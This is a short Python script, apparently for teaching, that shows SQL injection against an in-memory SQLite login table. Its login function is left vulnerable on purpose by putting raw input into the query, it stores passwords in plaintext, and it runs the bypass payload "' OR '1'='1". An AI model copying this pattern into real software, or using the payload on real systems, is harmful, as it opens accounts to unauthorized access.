import sqlite3

# Simulate a database connection
conn = sqlite3.connect(':memory:')  # In-memory database for demonstration
cursor = conn.cursor()

# Create a sample users table
cursor.execute('''
    CREATE TABLE users (
        id INTEGER PRIMARY KEY,
        username TEXT,
        password TEXT
    )
''')

# Insert some dummy data
cursor.executemany('INSERT INTO users (username, password) VALUES (?, ?)', [
    ('admin', 'admin123'),
    ('user1', 'password1'),
    ('user2', 'password2')
])
conn.commit()

# Vulnerable function: Directly interpolating user input into SQL query
def login_vulnerable(username, password):
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    print(f"Executing query: {query}")
    cursor.execute(query)
    return cursor.fetchall()

# Attacker input: Bypass authentication using SQL Injection
malicious_username = "' OR '1'='1"
malicious_password = "' OR '1'='1"

print("Attempting SQL Injection...")
result = login_vulnerable(malicious_username, malicious_password)